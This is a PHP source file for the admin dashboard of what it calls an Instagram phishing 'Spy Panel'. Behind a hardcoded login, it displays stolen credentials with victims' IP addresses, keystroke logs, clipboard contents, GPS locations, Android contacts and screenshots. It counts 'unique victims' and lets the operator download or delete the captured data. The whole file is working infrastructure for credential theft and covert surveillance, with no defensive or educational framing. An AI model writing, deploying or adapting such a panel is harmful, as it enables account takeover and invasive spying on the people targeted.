<?php
session_start();

$admin_user = 'admin';
$admin_pass = 'instagram@spy2024';

if(!isset($_SESSION['admin_logged_in'])) {
    if(isset($_POST['login'])) {
        if($_POST['username'] === $admin_user && $_POST['password'] === $admin_pass) {
            $_SESSION['admin_logged_in'] = true;
            header('Location: index.php');
            exit;
        } else {
            $error = 'Invalid credentials!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login - Spy Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, sans-serif; 
                background: #0a0a0f; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh;
            }
            .login-box {
                background: #1a1a2e;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 15px 35px rgba(0,0,0,0.5);
                width: 380px;
                border: 1px solid #16213e;
            }
            .login-box h2 {
                color: #e94560;
                text-align: center;
                margin-bottom: 30px;
                font-size: 24px;
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            .login-box input {
                width: 100%;
                padding: 14px 16px;
                margin: 10px 0;
                background: #0f3460;
                border: 1px solid #1a1a5e;
                border-radius: 8px;
                color: #fff;
                font-size: 14px;
                outline: none;
            }
            .login-box input:focus { border-color: #e94560; }
            .login-box button {
                width: 100%;
                padding: 14px;
                background: #e94560;
                color: #fff;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                margin-top: 20px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .login-box button:hover { background: #c23152; }
            .error { color: #ff4757; text-align: center; margin-top: 15px; font-size: 13px; }
            .logo-icon { text-align: center; margin-bottom: 10px; font-size: 48px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo-icon">&#128520;</div>
            <h2>Spy Panel</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required autocomplete="off">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Access Panel</button>
                <?php if(isset($error)) echo '<div class="error">'.$error.'</div>'; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ADMIN LOGGED IN
$logs_dir = '../logs/';
$uploads_dir = '../uploads/';

if(isset($_GET['action'])) {
    $action = $_GET['action'];
    if($action === 'clear_logs') {
        foreach(glob($logs_dir . '*') as $f) unlink($f);
        echo '<script>alert("All logs cleared!"); window.location="index.php";</script>';
        exit;
    }
    if($action === 'clear_uploads') {
        foreach(glob($uploads_dir . '*') as $f) unlink($f);
        echo '<script>alert("All uploads cleared!"); window.location="index.php";</script>';
        exit;
    }
    if($action === 'download' && isset($_GET['file'])) {
        $file = basename($_GET['file']);
        $path = $logs_dir . $file;
        if(!file_exists($path)) $path = $uploads_dir . $file;
        if(file_exists($path)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.$file.'"');
            readfile($path);
            exit;
        }
    }
    if($action === 'delete' && isset($_GET['file'])) {
        $file = basename($_GET['file']);
        @unlink($logs_dir . $file);
        @unlink($uploads_dir . $file);
        header('Location: index.php');
        exit;
    }
    if($action === 'logout') {
        session_destroy();
        header('Location: index.php');
        exit;
    }
}

$credentials = file_exists($logs_dir . 'credentials.txt') ? file($logs_dir . 'credentials.txt') : [];
$keystrokes = file_exists($logs_dir . 'keystrokes.txt') ? file($logs_dir . 'keystrokes.txt') : [];
$clipboard = file_exists($logs_dir . 'clipboard.txt') ? file($logs_dir . 'clipboard.txt') : [];
$location = file_exists($logs_dir . 'location.txt') ? file($logs_dir . 'location.txt') : [];
$contacts = file_exists($logs_dir . 'contacts.txt') ? file($logs_dir . 'contacts.txt') : [];
$screenshots = glob($uploads_dir . '*.png');

$total_creds = count($credentials);
$total_keystrokes = count($keystrokes);
$total_screenshots = count($screenshots);
$total_locations = count($location);

$ips = [];
foreach($credentials as $c) {
    // FIXED: Regex pattern - hyphen ko sahi position pe rakha
    if(preg_match('/IP: ([\d\.]+)/', $c, $m)) $ips[$m[1]] = true;
}
$total_victims = count($ips);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Panel - Instagram Phishing</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0f; color: #fff; }
        .sidebar {
            position: fixed; left: 0; top: 0; width: 250px; height: 100vh;
            background: #1a1a2e; padding: 20px; border-right: 1px solid #16213e; overflow-y: auto;
        }
        .sidebar h2 { font-size: 18px; color: #e94560; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; text-align: center; padding-bottom: 20px; border-bottom: 1px solid #16213e; }
        .sidebar .nav-item {
            display: flex; align-items: center; padding: 14px 16px; margin: 4px 0;
            border-radius: 8px; cursor: pointer; transition: 0.3s; color: #a0a0b0;
            text-decoration: none; font-size: 14px;
        }
        .sidebar .nav-item:hover, .sidebar .nav-item.active { background: #0f3460; color: #fff; }
        .sidebar .nav-item i { width: 24px; margin-right: 12px; font-size: 16px; }
        .sidebar .nav-item .badge { margin-left: auto; background: #e94560; color: #fff; padding: 2px 8px; border-radius: 12px; font-size: 11px; }
        .sidebar .logout-btn { display: block; text-align: center; padding: 12px; margin-top: 20px; background: rgba(233,69,96,0.1); border: 1px solid #e94560; border-radius: 8px; color: #e94560; text-decoration: none; font-size: 14px; }
        .sidebar .logout-btn:hover { background: #e94560; color: #fff; }
        .main-content { margin-left: 250px; padding: 30px 35px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #16213e; }
        .header h1 { font-size: 28px; font-weight: 600; }
        .header h1 span { color: #e94560; }
        .header .status { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #2ed573; }
        .header .status .dot { width: 10px; height: 10px; background: #2ed573; border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1a1a2e; border-radius: 12px; padding: 25px; border: 1px solid #16213e; transition: 0.3s; }
        .stat-card:hover { border-color: #e94560; transform: translateY(-2px); }
        .stat-card .icon { font-size: 32px; margin-bottom: 15px; }
        .stat-card .stat-value { font-size: 36px; font-weight: 700; margin-bottom: 5px; }
        .stat-card .stat-label { font-size: 13px; color: #a0a0b0; text-transform: uppercase; letter-spacing: 1px; }
        .stat-card.red .icon { color: #e94560; }
        .stat-card.red .stat-value { color: #e94560; }
        .stat-card.blue .icon { color: #3498db; }
        .stat-card.blue .stat-value { color: #3498db; }
        .stat-card.green .icon { color: #2ed573; }
        .stat-card.green .stat-value { color: #2ed573; }
        .stat-card.yellow .icon { color: #f39c12; }
        .stat-card.yellow .stat-value { color: #f39c12; }
        .stat-card.purple .icon { color: #9b59b6; }
        .stat-card.purple .stat-value { color: #9b59b6; }
        .section { background: #1a1a2e; border-radius: 12px; padding: 25px; margin-bottom: 25px; border: 1px solid #16213e; }
        .section-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #16213e; display: flex; justify-content: space-between; align-items: center; }
        .section-title .actions { display: flex; gap: 10px; }
        .btn { padding: 8px 16px; border-radius: 6px; border: none; cursor: pointer; font-size: 13px; font-weight: 500; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; transition: 0.3s; }
        .btn-danger { background: #e94560; color: #fff; }
        .btn-danger:hover { background: #c23152; }
        .btn-primary { background: #3498db; color: #fff; }
        .btn-primary:hover { background: #2980b9; }
        .btn-success { background: #2ed573; color: #fff; }
        .btn-success:hover { background: #26b863; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .data-table { width: 100%; border-collapse: collapse; }
        .data-table th { text-align: left; padding: 12px 15px; background: #0f3460; color: #a0a0b0; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid #16213e; }
        .data-table td { padding: 12px 15px; border-bottom: 1px solid #16213e; font-size: 14px; color: #d0d0d0; word-break: break-all; }
        .data-table tr:hover td { background: rgba(15,52,96,0.3); }
        .data-table .password-cell { font-family: 'Courier New', monospace; color: #e94560; font-weight: 600; }
        .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
        .screenshot-card { background: #0f3460; border-radius: 8px; overflow: hidden; border: 1px solid #16213e; transition: 0.3s; }
        .screenshot-card:hover { border-color: #e94560; transform: scale(1.02); }
        .screenshot-card img { width: 100%; height: 200px; object-fit: cover; cursor: pointer; }
        .screenshot-card .info { padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
        .screenshot-card .info .filename { font-size: 12px; color: #a0a0b0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .screenshot-card .info .actions a { color: #e94560; margin-left: 8px; text-decoration: none; font-size: 14px; }
        .screenshot-card .info .actions a:hover { color: #ff6b81; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
        .modal img { max-width: 90%; max-height: 90%; border-radius: 8px; }
        .modal .close-modal { position: absolute; top: 20px; right: 30px; color: #fff; font-size: 36px; cursor: pointer; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .log-viewer { background: #0a0a0f; border-radius: 8px; padding: 15px; max-height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.8; border: 1px solid #16213e; }
        .log-viewer .line { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.05); color: #d0d0d0; }
        .log-viewer .line .timestamp { color: #3498db; }
        .log-viewer .line .ip { color: #2ed573; }
        .empty-state { text-align: center; padding: 60px 20px; color: #a0a0b0; }
        .empty-state i { font-size: 64px; margin-bottom: 20px; opacity: 0.3; }
        .empty-state h3 { margin-bottom: 10px; color: #a0a0b0; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: #16213e; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #e94560; }
        @media (max-width: 768px) { .sidebar { display: none; } .main-content { margin-left: 0; padding: 20px; } }
    </style>
</head>
<body>

<div class="sidebar">
    <h2><i class="fas fa-skull"></i> Spy Panel</h2>
    <a href="#" class="nav-item active" onclick="showTab('dashboard')"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
    <a href="#" class="nav-item" onclick="showTab('credentials')"><i class="fas fa-key"></i> Credentials <span class="badge"><?= $total_creds ?></span></a>
    <a href="#" class="nav-item" onclick="showTab('keystrokes')"><i class="fas fa-keyboard"></i> Keystrokes <span class="badge"><?= $total_keystrokes ?></span></a>
    <a href="#" class="nav-item" onclick="showTab('screenshots')"><i class="fas fa-camera"></i> Screenshots <span class="badge"><?= $total_screenshots ?></span></a>
    <a href="#" class="nav-item" onclick="showTab('locations')"><i class="fas fa-map-marker-alt"></i> Locations <span class="badge"><?= $total_locations ?></span></a>
    <a href="#" class="nav-item" onclick="showTab('clipboard')"><i class="fas fa-clipboard"></i> Clipboard</a>
    <a href="#" class="nav-item" onclick="showTab('contacts')"><i class="fas fa-address-book"></i> Contacts</a>
    <a href="?action=logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
</div>

<div class="main-content">
    <div class="header">
        <div>
            <h1><span>&#128520;</span> Spy Dashboard</h1>
            <div style="color:#a0a0b0;font-size:13px;margin-top:5px;">
                <i class="fas fa-users"></i> <?= $total_victims ?> Victims | 
                <i class="fas fa-database"></i> <?= $total_creds + $total_keystrokes + $total_screenshots ?> Data Points
            </div>
        </div>
        <div class="status"><div class="dot"></div> System Active</div>
    </div>

    <!-- Dashboard Tab -->
    <div id="tab-dashboard" class="tab-content active">
        <div class="stats-grid">
            <div class="stat-card red">
                <div class="icon"><i class="fas fa-key"></i></div>
                <div class="stat-value"><?= $total_creds ?></div>
                <div class="stat-label">Credentials Captured</div>
            </div>
            <div class="stat-card green">
                <div class="icon"><i class="fas fa-keyboard"></i></div>
                <div class="stat-value"><?= $total_keystrokes ?></div>
                <div class="stat-label">Keystrokes Logged</div>
            </div>
            <div class="stat-card blue">
                <div class="icon"><i class="fas fa-camera"></i></div>
                <div class="stat-value"><?= $total_screenshots ?></div>
                <div class="stat-label">Screenshots Taken</div>
            </div>
            <div class="stat-card yellow">
                <div class="icon"><i class="fas fa-map-marker-alt"></i></div>
                <div class="stat-value"><?= $total_locations ?></div>
                <div class="stat-label">Locations Tracked</div>
            </div>
            <div class="stat-card purple">
                <div class="icon"><i class="fas fa-users"></i></div>
                <div class="stat-value"><?= $total_victims ?></div>
                <div class="stat-label">Unique Victims</div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-title">
                Recent Activity
                <div class="actions">
                    <a href="?action=clear_logs" class="btn btn-danger btn-sm" onclick="return confirm('Clear all logs?')"><i class="fas fa-trash"></i> Clear All</a>
                </div>
            </div>
            <?php if($total_creds > 0): ?>
            <div class="log-viewer">
                <?php $recent = array_slice(array_reverse($credentials), 0, 20);
                foreach($recent as $line): 
                    $line = htmlspecialchars($line);
                    $line = preg_replace('/(\d{4}\-\d{2}\-\d{2} \d{2}\:\d{2}\:\d{2})/', '<span class="timestamp">$1</span>', $line);
                    $line = preg_replace('/(IP\: [\d\.]+)/', '<span class="ip">$1</span>', $line);
                ?>
                <div class="line"><?= $line ?></div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-inbox"></i><h3>No Data Yet</h3><p>Waiting for victims to interact with the phishing page...</p></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Credentials Tab -->
    <div id="tab-credentials" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-key"></i> Captured Credentials
                <div class="actions">
                    <a href="?action=download&file=credentials.txt" class="btn btn-success btn-sm"><i class="fas fa-download"></i> Download</a>
                    <a href="?action=clear_logs" class="btn btn-danger btn-sm" onclick="return confirm('Clear all?')"><i class="fas fa-trash"></i> Clear</a>
                </div>
            </div>
            <?php if($total_creds > 0): ?>
            <div style="overflow-x:auto;">
                <table class="data-table">
                    <thead><tr><th>#</th><th>Date/Time</th><th>IP Address</th><th>Email / Username</th><th>Password</th></tr></thead>
                    <tbody>
                        <?php foreach(array_reverse($credentials) as $i => $line): 
                            preg_match('/^([\d\-\:\s]+) \| IP\: ([\d\.]+) \| Email\: (.+) \| Password\: (.+) \|/', $line, $m);
                            $time = $m[1] ?? 'N/A'; $ip = $m[2] ?? 'N/A'; $email = $m[3] ?? 'N/A'; $pass = $m[4] ?? $line;
                        ?>
                        <tr>
                            <td class="entry-num"><?= $total_creds - $i ?></td>
                            <td style="font-size:12px;color:#3498db;"><?= htmlspecialchars($time) ?></td>
                            <td style="color:#2ed573;font-size:13px;"><?= htmlspecialchars($ip) ?></td>
                            <td><?= htmlspecialchars($email) ?></td>
                            <td class="password-cell"><?= htmlspecialchars($pass) ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-key"></i><h3>No Credentials Captured</h3></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Keystrokes Tab -->
    <div id="tab-keystrokes" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-keyboard"></i> Keystroke Logs
                <div class="actions">
                    <a href="?action=download&file=keystrokes.txt" class="btn btn-success btn-sm"><i class="fas fa-download"></i> Download</a>
                    <a href="?action=clear_logs" class="btn btn-danger btn-sm" onclick="return confirm('Clear all?')"><i class="fas fa-trash"></i> Clear</a>
                </div>
            </div>
            <?php if($total_keystrokes > 0): ?>
            <div class="log-viewer" style="max-height:500px;">
                <?php foreach(array_reverse($keystrokes) as $line): 
                    $line = htmlspecialchars($line);
                    $line = preg_replace('/(\d{4}\-\d{2}\-\d{2} \d{2}\:\d{2}\:\d{2})/', '<span class="timestamp">$1</span>', $line);
                    $line = preg_replace('/(IP\: [\d\.]+)/', '<span class="ip">$1</span>', $line);
                ?><div class="line"><?= $line ?></div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-keyboard"></i><h3>No Keystrokes Logged</h3></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Screenshots Tab -->
    <div id="tab-screenshots" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-camera"></i> Screenshots
                <div class="actions">
                    <a href="?action=clear_uploads" class="btn btn-danger btn-sm" onclick="return confirm('Delete all screenshots?')"><i class="fas fa-trash"></i> Clear All</a>
                </div>
            </div>
            <?php if($total_screenshots > 0): ?>
            <div class="screenshot-grid">
                <?php foreach(array_reverse($screenshots) as $ss): 
                    $filename = basename($ss);
                    $filesize = filesize($ss);
                    $size = $filesize > 1024 ? round($filesize/1024, 1).' KB' : $filesize.' B';
                ?>
                <div class="screenshot-card">
                    <img src="../uploads/<?= $filename ?>" alt="<?= $filename ?>" onclick="openModal('../uploads/<?= $filename ?>')">
                    <div class="info">
                        <div class="filename" title="<?= $filename ?>"><i class="far fa-image"></i> <?= substr($filename, 0, 25).'...' ?><span style="display:block;font-size:10px;color:#666;margin-top:2px;"><?= $size ?></span></div>
                        <div class="actions">
                            <a href="?action=download&file=<?= $filename ?>" title="Download"><i class="fas fa-download"></i></a>
                            <a href="?action=delete&file=<?= $filename ?>" title="Delete" onclick="return confirm('Delete?')"><i class="fas fa-times"></i></a>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-camera"></i><h3>No Screenshots Captured</h3></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Locations Tab -->
    <div id="tab-locations" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-map-marker-alt"></i> GPS Locations
                <div class="actions">
                    <a href="?action=download&file=location.txt" class="btn btn-success btn-sm"><i class="fas fa-download"></i> Download</a>
                </div>
            </div>
            <?php if($total_locations > 0): ?>
            <div class="log-viewer" style="max-height:500px;">
                <?php foreach(array_reverse($location) as $line): 
                    $line = htmlspecialchars($line);
                    $line = preg_replace('/(\d{4}\-\d{2}\-\d{2} \d{2}\:\d{2}\:\d{2})/', '<span class="timestamp">$1</span>', $line);
                    $line = preg_replace('/(Lat\: [\d\.]+), (Lon\: [\d\.]+)/', '<span class="ip">$1, $2</span>', $line);
                ?><div class="line"><?= $line ?></div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-map-marker-alt"></i><h3>No Locations Tracked</h3></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Clipboard Tab -->
    <div id="tab-clipboard" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-clipboard"></i> Clipboard Data
                <div class="actions">
                    <a href="?action=download&file=clipboard.txt" class="btn btn-success btn-sm"><i class="fas fa-download"></i> Download</a>
                </div>
            </div>
            <?php if(count($clipboard) > 0): ?>
            <div class="log-viewer" style="max-height:500px;">
                <?php foreach(array_reverse($clipboard) as $line): ?>
                <div class="line"><?= htmlspecialchars($line) ?></div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-clipboard"></i><h3>No Clipboard Data</h3></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Contacts Tab -->
    <div id="tab-contacts" class="tab-content">
        <div class="section">
            <div class="section-title">
                <i class="fas fa-address-book"></i> Contacts (Android)
                <div class="actions">
                    <a href="?action=download&file=contacts.txt" class="btn btn-success btn-sm"><i class="fas fa-download"></i> Download</a>
                </div>
            </div>
            <?php if(count($contacts) > 0): ?>
            <div class="log-viewer" style="max-height:500px;">
                <?php foreach(array_reverse($contacts) as $line): ?>
                <div class="line"><?= htmlspecialchars($line) ?></div>
                <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div class="empty-state"><i class="fas fa-address-book"></i><h3>No Contacts Data</h3></div>
            <?php endif; ?>
        </div>
    </div>
</div>

<div class="modal" id="imgModal" onclick="this.style.display='none'">
    <span class="close-modal">&times;</span>
    <img id="modalImg" src="">
</div>

<script>
function showTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('tab-' + tabName).classList.add('active');
    document.querySelector('.nav-item[onclick="showTab(\''+tabName+'\')"]').classList.add('active');
}
function openModal(src) {
    document.getElementById('imgModal').style.display = 'flex';
    document.getElementById('modalImg').src = src;
}
</script>
</body>
</html>